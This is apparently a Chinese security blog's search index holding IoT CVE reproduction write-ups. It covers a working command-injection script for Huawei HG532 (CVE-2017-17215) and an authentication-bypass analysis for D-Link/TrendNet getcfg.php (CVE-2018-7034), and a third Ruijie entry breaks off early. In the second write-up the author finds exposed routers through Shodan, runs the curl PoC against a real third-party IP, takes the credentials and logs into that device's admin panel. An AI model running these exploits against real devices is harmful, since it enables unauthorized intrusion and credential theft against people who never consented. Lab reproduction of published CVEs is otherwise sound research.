<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2017-17215复现_华为HG532命令执行</title>
    <url>/2025/05/01/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>前两次的漏洞复现都挺难挺费力的，这次来复现个简单点的：CVE-2017-17215 ，关于华为 HG532 路由器可能存在的远程代码执行。整个的复现过程还是比较顺利的，虽然也踩了不少坑，但解决的还都算快。</p>
<p>该漏洞的起因是<code>upnp</code>服务中的<code>NewStatsURL</code>和<code>NewDownloadURL</code>标签存在命令注入，故可以在端口<code>37215</code>上，向<code>uri</code>为<code>/ctrlt/DeviceUpgrade_1</code>的路径发送<code>POST</code>报文来触发漏洞进行命令执行。</p>
<span id="more"></span>

<h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><p><a href="https://pan.baidu.com/s/1N-Z8XyMJP97nEfrOBmVrnA">下载固件</a>，接着直接用binwalk对固件进行解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Me HG532eV100R001C02B015_upgrade_main.bin</span><br></pre></td></tr></table></figure>

<h2 id="仿真搭建"><a href="#仿真搭建" class="headerlink" title="仿真搭建"></a>仿真搭建</h2><p>环境如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>版本</th>
</tr>
</thead>
<tbody><tr>
<td>宿主机</td>
<td>Ubuntu20.04</td>
</tr>
<tr>
<td>内核</td>
<td>vmlinux-2.6.32-5-4kc-malta</td>
</tr>
<tr>
<td>映像</td>
<td>debian_squeeze_mips_standard.qcow2</td>
</tr>
<tr>
<td>qemu</td>
<td>qemu-system-mips</td>
</tr>
</tbody></table>
<p>一开始用的内核是<code>vmlinux-3.2.0-4-4kc-malta</code>这个版本的，但是在执行<code>/bin/mic</code>的时候会报错，报错表示执行<code>/bin/mic</code>的过程中会用到某个驱动或工具只支持内核<code>2.6.20</code>，于是我就换成了更接近的<code>2.6.32-5-4kc</code>（一开始换的是<code>5-5kc</code>，没想到又精准踩坑，启动qemu的时候直接卡住了）是没问题的。</p>
<p>执行网络配置脚本net.sh：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sudo</span> ifconfig eth0 down</span></span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo brctl stp br0 off</span><br><span class="line">sudo brctl setfd br0 1</span><br><span class="line">sudo brctl sethello br0 1</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo brctl show br0</span><br><span class="line">sudo brctl showstp br0</span><br><span class="line">sudo tunctl -t tap0 -u root</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>

<p>执行启动脚本start.sh：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -cpu 74Kf \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel /home/wen/Desktop/mips_qemu_system/vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda /home/wen/Desktop/mips_qemu_system/debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -nographic -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>登录查看IP，然后在宿主机上成功ping通即可。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011533794.png" alt="image-20250501153339609" style="zoom:50%;" />

<p>为了方便后面的操作，可以执行以下命令，将路由器的文件系统根目录作为一个临时的chroot环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd squashfs-root</span><br><span class="line">mount --bind /proc ./proc</span><br><span class="line">mount --bind /dev ./dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17215">CVE-2017-17215</a> 上面对该漏洞的描述可知，<strong>经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击</strong>，即漏洞的关键点在于开启37215这个端口号。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505021012757.png" alt="1"></p>
<p>搜索<code>37215</code>，发现其存在于<code>bin/mic</code>这个文件</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011633403.png" alt="image-20250501163308229"></p>
<p>执行<code>/bin/mic</code>后，会占用当前这个终端，且此时网卡<code>eth0</code>的IP没了，网桥<code>br0</code>的IP也变成了192.168.1.1，因此我们也不能ssh连接再开一个终端</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011806872.png" alt="image-20250501165409513" style="zoom:50%;" />

<p>所以我们在ssh连接的终端上执行<code>/bin/mic</code>文件就行了，然后在原终端执行<code>ifconfig eth0 192.168.107.135/24 up</code>，为网卡<code>eth0</code>重新配置IP，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011703040.png" alt="image-20250501170336797" style="zoom:50%;" />

<p>执行<code>netstat -a</code>显示本地已打开的端口，发现此时<code>37215</code>端口已被成功监听</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011706152.png" alt="image-20250501170651774" style="zoom:50%;" />

<p>用<code>nmap -p 37215 192.168.107.135</code>扫描端口，同样显示<code>37215</code>已打开</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011709144.png" alt="image-20250501170918099"  />

<p>接下来我们执行下面的脚本，向端口<code>37215</code>发送恶意数据报以发起攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">Authorization = &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line">headers = &#123;&quot;Authorization&quot;: Authorization&#125;</span><br><span class="line"></span><br><span class="line">print(&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;)</span><br><span class="line">cmd = input(&quot;command &gt; &quot;)</span><br><span class="line"></span><br><span class="line">data = f&#x27;&#x27;&#x27;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">            &lt;NewStatusURL&gt;;&#123;cmd&#125;;&lt;/NewStatusURL&gt;</span><br><span class="line">            &lt;NewDownloadURL&gt;;&#123;cmd&#125;;&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">r = requests.post(&#x27;http://192.168.107.135:37215/ctrlt/DeviceUpgrade_1&#x27;, headers = headers, data = data)</span><br><span class="line">print(&quot;\nstatus_code: &quot; + str(r.status_code))</span><br><span class="line">print(&quot;\n&quot; + r.text)</span><br></pre></td></tr></table></figure>

<p>输入任意命令让其执行，这里我输入<code>mkdir wen</code>来创建一个目录</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011739103.png" alt="1"></p>
<p>此时之前执行<code>/bin/mic</code>处的回显如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011732975.png" alt="image-20250501173246598" style="zoom:50%;" />

<p>同时执行ls，发现目录创建成功</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011735638.png" alt="image-20250501173538525" style="zoom: 67%;" />

<h2 id="一些疑问"><a href="#一些疑问" class="headerlink" title="一些疑问"></a>一些疑问</h2><p>看其他师傅的文章有提到有CVE披露的报告中说upnp二进制文件是此次漏洞的来源，经过对upnp文件的逆向分析后，我也确实在该文件中发现了命令注入，但是一个作为恶意数据的来源，一作为恶意数据最后被执行的地方，我目前还不知道<code>mic</code>和<code>upnp</code>这两个文件之间的联系，可能这也是我为什么觉得这次的复现很简单了……</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.iotsec-zone.com/article/384#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
<p><a href="https://zikh26.github.io/posts/719b289c.html">CVE-2017-17215复现（华为HG532命令执行） | ZIKH26’s Blog</a></p>
<p><a href="https://blog.csdn.net/The54No1/article/details/129362750">HG532命令执行漏洞复现（CVE-2017-17215）_安装attifyos v3.0虚拟机-CSDN博客</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>CVE复现</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-7034复现_D-Link信息泄露(权限绕过)</title>
    <url>/2025/05/21/CVE-2018-7034%E5%A4%8D%E7%8E%B0-D-Link%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>该漏洞的起因是身份验证是否成功的标识（<code>AUTHORIZED_GROUP</code>）会被添加到 <code>POST</code> 报文数据的后面，而攻击者可以通过将<code>AUTHORIZED_GROUP=1</code> 作为 <code>POST</code> 报文数据的一部分来发送，当读取报文的时候只有报文中的第一个 <code>=</code> 被识别到继而将后面的<code>AUTHORIZED_GROUP=1</code> 一起读入并写入来绕过身份验证，造成登录信息的泄露。</p>
<span id="more"></span>

<p><a href="https://pan.baidu.com/s/1heHs3W04AViqCue4wX61fQ#qpkj">固件链接</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>根据 [CVE-2018-7034](<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034">CVE - CVE-2018-7034漏洞</a>) 上对该漏洞的披露可知，由<code>getcfg.php</code>中的请求所示，攻击者可以通过<code>AUTHORIZED_GROUP=1</code>值来绕过身份验证。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505121711977.png" alt="image-20250502101510755"></p>
<h2 id="漏洞前提分析"><a href="#漏洞前提分析" class="headerlink" title="漏洞前提分析"></a>漏洞前提分析</h2><p>so，我们先来分析一下<code>getcfg.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$_POST[&quot;CACHE&quot;]=false</span></span><br><span class="line"><span class="comment">//$AUTHORIZED_GROUP&gt;=0</span></span><br><span class="line">...</span><br><span class="line">		<span class="comment">/* cut_count() will return 0 when no or only one token. */</span></span><br><span class="line">		<span class="variable">$SERVICE_COUNT</span> = <span class="title function_ invoke__">cut_count</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: got &quot;</span>.<span class="variable">$SERVICE_COUNT</span>.<span class="string">&quot; service(s): &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>]);</span><br><span class="line">		<span class="variable">$SERVICE_INDEX</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="variable">$SERVICE_INDEX</span> &lt; <span class="variable">$SERVICE_COUNT</span>)<span class="comment">//传入的SERVICES中需要有逗号,好像是token至少要有两个</span></span><br><span class="line">		&#123;   <span class="comment">//cut_count()不是php的内置函数，目前也没找到该函数的自定义部分，</span></span><br><span class="line">		<span class="comment">// 只能猜测这里的作用是对SERVICES以 , 为分隔符计算数量</span></span><br><span class="line">			<span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: serivce[&quot;</span>.<span class="variable">$SERVICE_INDEX</span>.<span class="string">&quot;] = &quot;</span>.<span class="variable">$GETCFG_SVC</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$GETCFG_SVC</span>!=<span class="string">&quot;&quot;</span>)   <span class="comment">//$GETCFG_SVC不为空，这里就是DEVICE.ACCOUNT</span></span><br><span class="line">			&#123;   <span class="comment">//就能load文件DEVICE.ACCOUNT.xml.php泄露用户密码等敏感信息</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line">				<span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$SERVICE_INDEX</span>++;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>分析后可知，该文件最终要执行的操作是，加载<code>/htdocs/webinc/getcfg/</code>目录下以<code>.xml.php</code>结尾的文件，当然前提是要绕过一系列条件。经查找后发现目录下的<code>DEVICE.ACCOUNT.xml.php</code>文件中有用户密码等敏感信息，可以被我们泄露。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312507.png" alt="image-20250516095738822" style="zoom: 50%;" />

<h3 id="程序启动"><a href="#程序启动" class="headerlink" title="程序启动"></a>程序启动</h3><p>直接运行<code>/htdocs/cgibin</code>文件会输出如下内容：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312853.png" alt="image-20250519150650816" style="zoom:80%;" />

<p>看一下<code>cgibin</code>文件中的<code>main</code>函数，发现其要求第一个命令行参数是给定的参数这里就是<code>phpcgi</code>，搜索一下发现在<code>/usr/sbin/</code>目录下有一个符号链接<code>phpcgi</code>指向<code>/htdocs/cgibin</code>，不过这个符号链接被损坏了要删除这个再创建一个，如下是新建的符号链接。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212315014.png" alt="image-20250519154926888"></p>
<p>然后执行<code>qemu-mipsel ./phpcgi</code>命令便能运行<code>cgibin</code>程序了。</p>
<h2 id="寻找漏洞原因"><a href="#寻找漏洞原因" class="headerlink" title="寻找漏洞原因"></a>寻找漏洞原因</h2><p>现在需要对二进制文件<code>cgibin</code>进行逆向分析，主要分析的是<code>main</code>函数下的<code>phpcgi_main</code>函数。</p>
<h3 id="phpcgi-main函数分析"><a href="#phpcgi-main函数分析" class="headerlink" title="phpcgi_main函数分析"></a>phpcgi_main函数分析</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212314252.png" alt="image-20250520225115704" style="zoom:50%;" />

<p><code>sobj_new()</code>函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//v7 = sobj_new();</span></span><br><span class="line">_DWORD *<span class="title function_">sobj_new</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// $v0</span></span><br><span class="line">  result = <span class="built_in">malloc</span>(<span class="number">0x18u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>结合分析可知，<code>0x414264</code>地址处中<code>$v0</code>寄存器中存放的便是<code>malloc</code>函数申请的地址块，也就是v7中的内容，是<code>0x438008</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212314489.png" alt="QQ_1747363464219" style="zoom: 50%;" />

<p>接下来会执行<code>sobj_add_string(v7, *(_DWORD *)(a2 + 4));</code>函数，这里<code>a2</code>是传入的命令行参数，我们猜测这里是将命令行参数添加到<code>v7</code>的地址块中，如下，</p>
<p><code>sobj_add_string()</code>执行前</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312508.png" alt="image-20250516103754011" style="zoom:67%;" />

<p>执行后，确实把第一个命令行参数<code>aaaa</code>添加进去了</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212314548.png" alt="QQ_1747363318826" style="zoom:67%;" />

<p>接着执行<code>sobj_add_char()</code>，这一步会在<code>aaaa</code>后面再加一个<code>\n</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312032.png" alt="image-20250516110426803" style="zoom: 67%;" />

<p>接下来是一个<code>for</code>循环：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = a3; *i; ++i )                       <span class="comment">// a3是环境变量，这个循环应该是将环境变量分别也添加到上面的地址块中</span></span><br><span class="line">&#123;</span><br><span class="line">  sobj_add_string(v6, <span class="string">&quot;_SERVER_&quot;</span>);</span><br><span class="line">  sobj_add_string(v6, *i);</span><br><span class="line">  sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其作用是解析<code>envp</code>，并将解析后的环境变量都添加到地址块中，也就是第二个命令行参数<code>aaaa</code>的后面。</p>
<h3 id="cgibin-parse-request函数分析"><a href="#cgibin-parse-request函数分析" class="headerlink" title="cgibin_parse_request函数分析"></a>cgibin_parse_request函数分析</h3><p>接着看<code>cgibin_parse_request</code>函数，调试这个函数的时候发现<code>CONTENT_TYPE</code>和<code>CONTENT_LENGTH</code>这两个环境变量需要存在，接着执行<code>parse_uri</code>函数，该函数会将环境变量<code>REQUEST_URI</code>中<code>?</code>后面的内容添加到结构体中，故<code>REQUEST_URI</code>这个环境变量也需要存在。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312175.png" alt="image-20250519224112677" style="zoom:50%;" />

<p>然后是一个<code>strncasecmp</code>比较，会比较<code>v9</code>与<code>v14</code>前12个字符是否相等，如果相等会执行一个函数，这里我光看ida中的代码还不知道是什么函数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313273.png" alt="image-20250519225140444" style="zoom:50%;" />

<p><code>v10</code>是<code>.data</code>段<code>off_433014</code>处的内容<code>application/</code>如下，而<code>v14</code>是环境变量<code>CONTENT_TYPE</code>的值，因此我们启动时的环境变量<code>CONTENT_TYPE</code>需要设置为<code>application/x-www-form-urlencoded</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313179.png" alt="image-20250519224745691" style="zoom:50%;" />

<p>在gdb调试的时候，可以知道执行的函数地址是<code>0x40445c</code>，其实看其他师傅文章中ida能够反汇编出这个函数即<code>sub_40445C</code>，但是我只能看到该函数的汇编代码😓</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312442.png" alt="image-20250519231208375" style="zoom:50%;" />

<p>此时的启动脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E CONTENT_LENGTH=3000 -E REQUEST_URI=&quot;M?31&quot; -g 1234 ./phpcgi aaaa </span><br></pre></td></tr></table></figure>

<h3 id="sub-40445c函数分析"><a href="#sub-40445c函数分析" class="headerlink" title="sub_40445c函数分析"></a>sub_40445c函数分析</h3><p>在该函数中，会先后执行一个<code>select</code>和<code>read</code>函数，我们在执行<code>select</code>函数前先把<code>POST</code>报文写到标准输入流中，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313091.png" alt="image-20250520162114872" style="zoom: 67%;" />

<p>执行<code>select</code>后便能<code>read</code>读入<code>POST</code>报文数据，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313406.png" alt="image-20250520162457308" style="zoom:50%;" />

<p>注意启动时设置的<code>CONTENT_LENGTH</code>要跟写入的<code>POST</code>报文数据长度一样，否则读完我们输入的内容后会再次<code>select</code>和<code>read</code>，此时标准输入流中已经没有数据了，便会像前面一样报错。</p>
<p>此时的启动脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E CONTENT_LENGTH=&quot;44&quot; -E REQUEST_URI=&quot;M?31&quot; -g 1234 ./phpcgi aaaa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POST报文数据：</span></span><br><span class="line">SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1</span><br></pre></td></tr></table></figure>

<p>接着会执行<code>sub_403864</code>函数（其实可以直接在IDA中分析代码得出，不过我的IDA并没有把<code>sub_40445c</code>函数反汇编）</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312940.png" alt="image-20250520163446760" style="zoom:50%;" />

<h3 id="sub-403864函数分析"><a href="#sub-403864函数分析" class="headerlink" title="sub_403864函数分析"></a>sub_403864函数分析</h3><p><code>sub_403864</code>函数的三个参数如下，正常会顺利进入下面两个<code>if</code>语句，然后进入循环，</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313551.png" alt="QQ_1747747760913" style="zoom:50%;" />

<p>这个循环会遍历<code>POST</code>报文数据，并以报文的第一个<code>=</code>为界限，将前后两段数据(也就是<code>a1[1]</code>和<code>a1[2]</code>)分别放到两个结构体中，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312019.png" alt="QQ_1747749676493" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312654.png" alt="QQ_1747749662464" style="zoom:50%;" />

<p>最后这里要注意的是，调试的时候发现<strong>在第32行这个位置会再一次调用<code>sub_403864</code>函数</strong>，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313929.png" alt="image-20250521182135261" style="zoom:50%;" />

<p>在第二次执行<code>sub_403864</code>函数的时候才会执行<code>sobj_unescape_uri</code>函数，对<code>POST</code>报文数据进行<code>url</code>解码，接着执行后面的写入操作。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313032.png" alt="QQ_1747750292802" style="zoom:50%;" />

<h3 id="sub-405AC0函数分析"><a href="#sub-405AC0函数分析" class="headerlink" title="sub_405AC0函数分析"></a>sub_405AC0函数分析</h3><p>gdb调试的时候继续往下走，会走到<code>0x405b00</code>地址，在<code>sub_405AC0</code>函数中，在如下这个位置：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312067.png" alt="QQ_1747751245400" style="zoom:50%;" />

<p>接下来会先向<code>a1</code>（最开始存放环境变量的结构体）中添加字符串<code>_POST_</code>，然后再将<code>a2[1]</code>（<code>POST</code>报文数据中<code>=</code>前面的内容）添加进去，接着还会添加<code>=</code>和<code>POST</code>报文数据中<code>=</code>后面的内容。其实就是将<code>POST</code>报文数据全部添加进去了，如下：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312069.png" alt="image-20250520224357245"></p>
<p>其实分析到现在，<strong>我们知道了发送的<code>POST</code>报文数据会被存储到哪个地方，正常情况下<code>POST</code>报文数据中只需要有<code>SERVICES=DEVICE.ACCOUNT</code>即可，但是为什么还要在后面加上<code>%0aAUTHORIZED_GROUP=1</code>，并且这样就可以绕过身份验证呢？</strong>我们还不知道，继续往下分析。</p>
<h3 id="phpcgi-main函数分析-1"><a href="#phpcgi-main函数分析-1" class="headerlink" title="phpcgi_main函数分析"></a>phpcgi_main函数分析</h3><p>接着程序流回到<code>phpcgi_main</code>函数上，会进入<code>if</code>执行<code>sess_validate()</code>函数，其中会打开一个文件如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313785.png" alt="image-20250521184925256" style="zoom:67%;" />

<p>这个文件我们用户模拟的环境上是没有的，所以需要自己去创建一下即可。</p>
<p>接下来的部分就比较重要了前面我一直迷迷糊糊的，在这里幡然醒悟一切都解释的通了。</p>
<p><strong>如下，执行完<code>sobj_add_char(v6, 10);</code>后<code>AUTHORIZED_GROUP=-1</code>会被添加到<code>v6</code>（前面分析的存放<code>POST</code>报文数据的结构体）中，也就是说正常情况下，会读入<code>POST</code>报文数据写到<code>v6</code>中，然后执行<code>sess_validate()</code>函数进行一个身份验证，当然验证肯定是不通过的，因此会返回<code>-1</code>与<code>AUTHORIZED_GROUP=</code>拼接，再将得到的<code>AUTHORIZED_GROUP=-1</code>添加到<code>v6</code>中具体位置就是<code>POST</code>报文的后面。</strong></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312534.png" alt="image-20250521204943772" style="zoom:50%;" />

<p>因此，直接将<code>AUTHORIZED_GROUP=1</code>放在原来的<code>POST</code>报文数据的后面，这样便能绕过身份验证伪造<code>sess_validate()</code>返回<code>1</code>，所以最后的<code>POST</code>报文数据是这样的：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">SERVICES</span><span class="operator">=</span>DEVICE.ACCOUNT%<span class="number">0</span>aAUTHORIZED_GROUP<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><p>在<a href="https://www.shodan.io/search?query=tew-751dr">这个网站</a>上查找还在用此路由器设备的站点</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212313781.png" alt="QQ_1747839344138" style="zoom: 50%;" />

<p>随便选一个，执行如下<code>poc</code>进行攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -d &quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot; &quot;http://174.104.16.176:8080/getcfg.php&quot;</span><br></pre></td></tr></table></figure>

<p>获得用户名和密码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312332.png" alt="QQ_1747839200401" style="zoom:50%;" />

<p>成功登录后台</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505212312464.png" alt="image-20250521230019649" style="zoom:50%;" />

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zikh26.github.io/posts/5f982ad5.html#%E5%89%8D%E8%A8%80">CVE-2018-7034复现（TrendNet路由器登录信息泄露） | ZIKH26’s Blog</a></p>
<p><a href="https://www.iotsec-zone.com/article/384#d-link-%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>CVE复现</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-34644复现_锐捷未授权命令执行</title>
    <url>/2025/04/27/CVE-2023-34644%E5%A4%8D%E7%8E%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>这是我目前复现的第二个漏洞，也挺难的，我觉得比第一次复现的DIR-815那个更复杂一点，大概花了近一个月的时间,期间很多次因为不同问题或同一个问题停滞。虽然是复现完了，但其实我感觉自己还没有懂透，尤其是逆向分析这部分很少有分析过这么多且复杂的代码，思路也大都是跟着其他师傅文章里的分析往下走的，等多复现几个漏洞后再来看看吧。不过呢，对于这次长达一个月的漏洞复现，还是有不少收获的。</p>
<span id="more"></span>

<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>链接: <a href="https://pan.baidu.com/s/1wHkXiHIErOQ9RJUF1gCrlA">https://pan.baidu.com/s/1wHkXiHIErOQ9RJUF1gCrlA</a></p>
<p>提取码: 7d79</p>
<p>直接从官网上下载的固件被加密过，需要对其进行解密，而且我也没有在官网上找到对应的固件🤨可能是因为时间有点久了下架了吧。因此呢，本文用的是已经解密过后的固件，直接用binwalk解压即可。</p>
<h2 id="寻找漏洞文件"><a href="#寻找漏洞文件" class="headerlink" title="寻找漏洞文件"></a>寻找漏洞文件</h2><p>我们要先找到无鉴权的API接口，此类固件的cgi部分通常都是用lua所写的，因此可以直接定位到<code>/usr/lib/lua/luci/controller/eweb/api.lua</code>文件。</p>
<h3 id="api-lua文件"><a href="#api-lua文件" class="headerlink" title="api.lua文件"></a>api.lua文件</h3><p>api.lua文件在<code>/usr/lib/lua/luci/controller/eweb/</code>目录下，该文件的大致结构如下：</p>
